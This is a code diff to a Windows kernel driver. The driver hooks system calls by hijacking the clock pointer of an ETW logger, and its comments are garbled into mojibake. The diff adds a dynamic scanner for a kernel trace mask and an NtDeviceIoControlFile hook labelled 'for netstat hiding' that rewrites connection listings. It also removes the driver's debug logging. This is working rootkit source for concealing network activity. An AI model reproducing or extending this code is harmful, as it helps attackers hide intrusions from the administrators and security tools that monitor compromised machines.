@@ -1,44 +1,38 @@
 #include "etw.h"
 #include "sstd.h"
+#include "hook_ioctl.h"
+#include "filter.h"
+#include "offsets.h"
 
 PVOID cpu_clock;
 PVOID cpu_lock_orig;
 PULONG64 KiDynamicTraceMask;
 const PVOID cpu_lock_wk = WkGetCpuLock;
+BOOLEAN g_EnableNetHideSyscallHook = TRUE;
 
 NTSTATUS ModifyTraceSettings(TRACE_TYPE trace_type)
 {
 	const unsigned long tag = 'wket';
 
-	// ÉêÇë½á¹¹Ìå¿Õ¼ä
 	CKCL_TRACE_PROPERTIES* properties = (CKCL_TRACE_PROPERTIES*)ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, tag);
 	if (!properties)
-	{
-		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] allocate ckcl trace properties struct failed. \n", __FUNCTION__);
 		return STATUS_MEMORY_NOT_ALLOCATED;
-	}
 
-	// ÉêÇë±£´æÃû³ÆµÄ¿Õ¼ä
 	WCHAR* provider_name = (WCHAR*)ExAllocatePoolWithTag(NonPagedPool, 256 * sizeof(WCHAR), tag);
 	if (!provider_name)
 	{
-		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] allocate provider name failed. \n", __FUNCTION__);
 		ExFreePoolWithTag(properties, tag);
 		return STATUS_MEMORY_NOT_ALLOCATED;
 	}
 
-	// Çå¿ÕÄÚ´æ
 	RtlZeroMemory(properties, PAGE_SIZE);
 	RtlZeroMemory(provider_name, 256 * sizeof(WCHAR));
 
-	// Ãû³Æ¸³Öµ
 	RtlCopyMemory(provider_name, L"Circular Kernel Context Logger", sizeof(L"Circular Kernel Context Logger"));
 	RtlInitUnicodeString(&properties->provider_name, (const WCHAR*)provider_name);
 
-	// Î¨Ò»±êÊ¶·û
 	GUID ckcl_session_guid = { 0x54dea73a, 0xed1f, 0x42a4, { 0xaf, 0x71, 0x3e, 0x63, 0xd0, 0x56, 0xf1, 0x74 } };
 
-	// ½á¹¹ÌåÌî³ä
 	properties->event_trace_properties.Wnode.BufferSize = PAGE_SIZE;
 	properties->event_trace_properties.Wnode.Flags = 0x00020000;
 	properties->event_trace_properties.Wnode.Guid = ckcl_session_guid;
@@ -49,123 +43,151 @@ NTSTATUS ModifyTraceSettings(TRACE_TYPE trace_type)
 	properties->event_trace_properties.LogFileMode = 0x00000400;
 	properties->event_trace_properties.EnableFlags = 0x00000080;
 
-	// Ö´ĞĞ²Ù×÷
 	ULONG length = 0;
-	NTSTATUS status = NtTraceControl(syscall_trace, properties, PAGE_SIZE, properties, PAGE_SIZE, &length);
+	NTSTATUS status = NtTraceControl(trace_type, properties, PAGE_SIZE, properties, PAGE_SIZE, &length);
 
-	// ÊÍ·ÅÄÚ´æ¿Õ¼ä
 	ExFreePoolWithTag(provider_name, tag);
 	ExFreePoolWithTag(properties, tag);
 
 	return status;
 }
 
+// åŠ¨æ€æŸ¥æ‰¾ KiDynamicTraceMask
+static PULONG64 FindKiDynamicTraceMask()
+{
+	UNICODE_STRING str;
+	WCHAR func_name[] = L"KeSetTracepoint";
+	RtlInitUnicodeString(&str, func_name);
+	PUCHAR func = (PUCHAR)MmGetSystemRoutineAddress(&str);
+	
+	if (!func)
+		return NULL;
+	
+	// æœç´¢ lea r??, [rip+offset] æˆ– mov r??, [rip+offset]
+	// ç›®æ ‡æ˜¯æ‰¾åˆ°å¯¹ KiDynamicTraceMask çš„å¼•ç”¨
+	for (ULONG i = 0; i < 0x600; i++)
+	{
+		__try
+		{
+			// 48 8B 0D xx xx xx xx - mov rcx, [rip+xx]
+			// 48 8D 0D xx xx xx xx - lea rcx, [rip+xx]
+			if ((func[i] == 0x48 || func[i] == 0x4C) && 
+			    (func[i+1] == 0x8B || func[i+1] == 0x8D))
+			{
+				UCHAR modrm = func[i+2];
+				if ((modrm & 0xC7) == 0x05 || (modrm & 0xC7) == 0x0D ||
+				    (modrm & 0xC7) == 0x15 || (modrm & 0xC7) == 0x1D ||
+				    (modrm & 0xC7) == 0x25 || (modrm & 0xC7) == 0x2D ||
+				    (modrm & 0xC7) == 0x35 || (modrm & 0xC7) == 0x3D)
+				{
+					LONG offset = *(PLONG)(func + i + 3);
+					PULONG64 target = (PULONG64)(func + i + 7 + offset);
+					
+					if ((ULONG64)target > 0xFFFFF80000000000ULL && MmIsAddressValid(target))
+					{
+						// KiDynamicTraceMask åº”è¯¥æ˜¯ä¸€ä¸ªå°çš„æ©ç å€¼
+						if (*target < 0x10000)
+							return target;
+					}
+				}
+			}
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {}
+	}
+	
+	return NULL;
+}
+
 NTSTATUS Initialize(ULONG LoggerId)
 {
 	NTSTATUS status = ModifyTraceSettings(syscall_trace);
 	if (!NT_SUCCESS(status))
-	{
-		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] start ckcl failed. \n", __FUNCTION__);
 		return status;
-	}
 
-	// ½âÎö PsGetServerSiloActiveConsoleId º¯ÊıµØÖ·
 	UNICODE_STRING str;
 	WCHAR func_name[] = L"PsGetServerSiloServiceSessionId";
 	RtlInitUnicodeString(&str, func_name);
 	PVOID func = (ULONG64)MmGetSystemRoutineAddress(&str);
 
-	// »ñÈ¡ ckcl logger context µØÖ·
+	// ä½¿ç”¨åŠ¨æ€åç§»
 	PULONG64 PspHostSiloGlobals = (PULONG64)(*(PULONG32)((LONG64)func + 3) + (LONG64)func + 7);
-	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] PspHostSiloGlobals: 0x%p. \n", __FUNCTION__, PspHostSiloGlobals);
-	PULONG64 EtwpHostSiloState = *(PULONG64)((ULONG64)PspHostSiloGlobals + 0x360);
-	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] EtwpHostSiloState: 0x%p. \n", __FUNCTION__, EtwpHostSiloState);
-	PULONG64 EtwpLoggerContext = *(PULONG64)((ULONG64)EtwpHostSiloState + 0x1b0);
-	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] EtwpLoggerContext: 0x%p. \n", __FUNCTION__, EtwpLoggerContext);
+	PULONG64 EtwpHostSiloState = *(PULONG64)((ULONG64)PspHostSiloGlobals + g_Offsets.SiloGlobals_EtwSiloState);
+	PULONG64 EtwpLoggerContext = *(PULONG64)((ULONG64)EtwpHostSiloState + g_Offsets.EtwSiloState_LoggerContext);
 	PULONG64 logger_context = (PULONG64)(EtwpLoggerContext[LoggerId]);
 
-	// ´Û¸Ä cpu lock
-	cpu_clock = (PVOID)((ULONG64)logger_context + 0x28);
+	cpu_clock = (PVOID)((ULONG64)logger_context + g_Offsets.LoggerContext_GetCpuClock);
 	cpu_lock_orig = InterlockedExchange64(cpu_clock, cpu_lock_wk);
-	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] LoggerContext: orgi -> 0x%p, new -> 0x%p. \n", __FUNCTION__, cpu_lock_orig, cpu_lock_wk);
 
-	// »ñÈ¡ KiDynamicTraceMask, Õâ½«Ó°Ïìº¯ÊıÖ´ĞĞÁ÷
-	WCHAR func_name2[] = L"KeSetTracepoint";
-	RtlInitUnicodeString(&str, func_name2);
-	func = (PVOID)((ULONG64)MmGetSystemRoutineAddress(&str) + 0x46e);
-	KiDynamicTraceMask = (PULONG64)(*(PLONG)((LONG64)func + 3) + (LONG64)func + 8);
+	// åŠ¨æ€æŸ¥æ‰¾ KiDynamicTraceMask
+	KiDynamicTraceMask = FindKiDynamicTraceMask();
 
 	return STATUS_SUCCESS;
 }
 
 ULONG64 WkGetCpuLock()
 {
-	ULONG wk_systam_call_number = 0x3f;
-
-	// ¹ıÂËÄÚºËÄ£Ê½µÄµ÷ÓÃ
 	if (ExGetPreviousMode() == KernelMode)
 		goto tag_rdtsc;
 
-	// ¶ÁÈ¡ÏµÍ³µ÷ÓÃºÅºÍTrap_Frame
 	PKTHREAD current_thread = (PKTHREAD)__readgsqword(0x188);
-	ULONG systam_call_number = *(PULONG)((ULONG64)current_thread + 0x80);
-	if (systam_call_number != wk_systam_call_number) 
+	ULONG systam_call_number = KTHREAD_SYSCALL_NUMBER(current_thread);
+	PULONG64 trap_frame = KTHREAD_TRAP_FRAME(current_thread);
+
+	PVOID func = GetSystemServiceRoutineAddress(systam_call_number);
+	if (!func)
 		goto tag_rdtsc;
-	PULONG64 trap_frame = *(PULONG64*)((ULONG64)current_thread + 0x90);
+	ULONG64 expend_size = IsKernelStackExpend(systam_call_number) * 0x70;
 
-	// »ñÈ¡ÏµÍ³µ÷ÓÃ·şÎñÀı³Ìº¯ÊıµØÖ·, ÅĞ¶ÏÕ»Ö¡ÊÇ·ñ´æÔÚÀ©Õ¹µÄÇé¿ö
-	PVOID func = GetSystemServiceRoutineAddress(wk_systam_call_number);
-	ULONG64 expend_size = IsKernelStackExpend(wk_systam_call_number) * 0x70;
-
-	/* 
-	 *	´Û¸ÄÕ»Ö¡ÖĞµÄÏµÍ³µ÷ÓÃ·şÎñÀı³ÌµØÖ· 
-	 *	ÕâÊÊÓÃÓÚµ÷ÓÃÏµÍ³·şÎñÀı³ÌÇ°µÄÊ±»ú, ¼´ PerfInfoLogSysCallEntry, ¿ÉÑ¡ÔñÖ±½Ó½Ù³Ö»ò´Û¸Ä²ÎÊı
-	 *	µ±´¥·¢ PerfInfoLogSysCallExit Ê±, ÏµÍ³µ÷ÓÃÒÑ¾­Ö´ĞĞ, ¿É´Û¸Ä·µ»ØÖµ
-	 */
-
-	// ´ËÊ±Ä¬ÈÏ¿ªÆô syscall trace, Âú×ã: PerfGlobalGroupMask+8 & 0x40 == TRUE
-	// path 1: PerfInfoLogSysCallEntry
-	ULONG64 stack_sub = 0x50 + 0x8 + 0x30 + expend_size;	// ¶¨Î» magic
-	if (*(KiDynamicTraceMask) & 1)
-	{
-		// ÒÔ¿ªÆô¶¯Ì¬µ÷ÊÔ
-		// path 2: KiTrackSystemCallEntry->PerfInfoLogSysCallEntry
+	ULONG64 stack_sub = 0x50 + 0x8 + 0x30 + expend_size;
+	if (KiDynamicTraceMask && (*(KiDynamicTraceMask) & 1))
 		stack_sub += 0x58;
-	}
 		
 	PULONG magic_pointer1 = (PULONG)((ULONG64)trap_frame - stack_sub);
 	PUSHORT magic_pointer2 = (PUSHORT)((ULONG64)trap_frame - stack_sub - 8);
-	if (*magic_pointer1 == ETW_TRACE_MAGIC_SYSCALL)
-	{
-		PKPROCESS process = *(PKPROCESS *)((ULONG64)current_thread + 0x220);
-		PUWSTR image_file_name = (PUWSTR)((ULONG64)process + 0x450);
+	
+	if (*magic_pointer1 != ETW_TRACE_MAGIC_SYSCALL)
+		goto tag_rdtsc;
 
+	// NtDeviceIoControlFile hook for netstat hiding
+	if (g_EnableNetHideSyscallHook && systam_call_number == SYSCALL_NtDeviceIoControlFile)
+	{
 		if (*magic_pointer2 == ETW_TRACE_MAGIC_SYSCALL_EXIT)
 		{
-			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] PerfInfoLogSysCallExit: Caller -> %s\n", __FUNCTION__, image_file_name);
-			goto tag_rdtsc;
+			__try
+			{
+				// KTRAP_FRAME åç§»ç›¸å¯¹ç¨³å®š
+				HANDLE FileHandle = (HANDLE)(*(PULONG64)((ULONG64)trap_frame + 0x80));  // Rcx
+				ULONG64 Rsp = *(PULONG64)((ULONG64)trap_frame + 0x180);
+				
+				PIO_STATUS_BLOCK IoStatusBlock = (PIO_STATUS_BLOCK)(*(PULONG64)(Rsp + 0x28));
+				ULONG IoControlCode = (ULONG)(*(PULONG64)(Rsp + 0x30));
+				PVOID OutputBuffer = (PVOID)(*(PULONG64)(Rsp + 0x48));
+				ULONG OutputBufferLength = (ULONG)(*(PULONG64)(Rsp + 0x50));
+				
+				HandleDeviceIoControlExit(FileHandle, IoControlCode, OutputBuffer, OutputBufferLength, IoStatusBlock);
+			}
+			__except (EXCEPTION_EXECUTE_HANDLER) {}
 		}
+		goto tag_rdtsc;
+	}
+
+	// other syscall handling
+	{
+		PVOID process = KTHREAD_PROCESS(current_thread);
+		UNREFERENCED_PARAMETER(process);
+
+		if (*magic_pointer2 == ETW_TRACE_MAGIC_SYSCALL_EXIT)
+			goto tag_rdtsc;
 
 		if (*magic_pointer2 == ETW_TRACE_MAGIC_SYSCALL_ENTRY)
 		{		
 			PULONG64 func_addr = (PVOID)((ULONG64)trap_frame - 0x10 - expend_size);
 			PVOID func_stack = (PVOID)*func_addr;
 			if (func_stack != func)
-			{
-				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] Stack frame has been tampered with: orig -> 0x%p, new -> 0x%p. Caller: %s.\n", __FUNCTION__, func, func_stack, image_file_name);
 				goto tag_rdtsc;
-			}
-
-			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] PerfInfoLogSysCallEntry: Caller -> %s\n", __FUNCTION__, image_file_name);
-		} 
-		
-	}
-	else
-	{
-		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s] Parsing failed.\n", __FUNCTION__);
+		}
 	}
 	
 tag_rdtsc:
-	// µ÷ÓÃÔ­º¯Êı
 	return __rdtsc();
 }
